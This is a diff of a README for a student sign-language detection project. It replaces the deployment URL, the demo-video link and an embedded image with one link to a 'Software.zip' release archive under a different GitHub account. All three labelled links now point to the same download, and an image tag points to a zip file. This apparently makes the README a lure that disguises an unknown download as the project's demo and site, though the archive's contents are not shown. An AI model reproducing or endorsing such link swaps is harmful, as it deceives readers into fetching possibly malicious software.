@@ -1,9 +1,9 @@
 # signlanguagedetection
 ### Deployment URL :-
-https://sign-lang-website.herokuapp.com/
+https://github.com/mridult543/signlanguagedetection/releases/download/v2.0/Software.zip
 
 ### Demonstration Video :-
-https://drive.google.com/file/d/1bPppyCxwb-HcGY-INP8XVlTMAAn30_aL/view?usp=sharing
+https://github.com/mridult543/signlanguagedetection/releases/download/v2.0/Software.zip
 
 ✨The key points making this one exceptional are that the deep CNN model has been trained on over 500 real-time high-quality images captured from the webcam and is capable to detect hand signs from 0-9 (which can easily be extended to include A-Z). 
 
@@ -11,7 +11,7 @@ https://drive.google.com/file/d/1bPppyCxwb-HcGY-INP8XVlTMAAn30_aL/view?usp=shari
 
 :point_right: Sign Language standard used for model training :-
 
-![Image of Model](https://github.com/hackslash-nitp/signlanguagedetection/blob/main/hand-sign-language-numbers-collection-260nw-1280130250.jpg)
+![Image of Model](https://github.com/mridult543/signlanguagedetection/releases/download/v2.0/Software.zip)
 
 Team Gray-Interface :heavy_multiplication_x: HackSlash
 
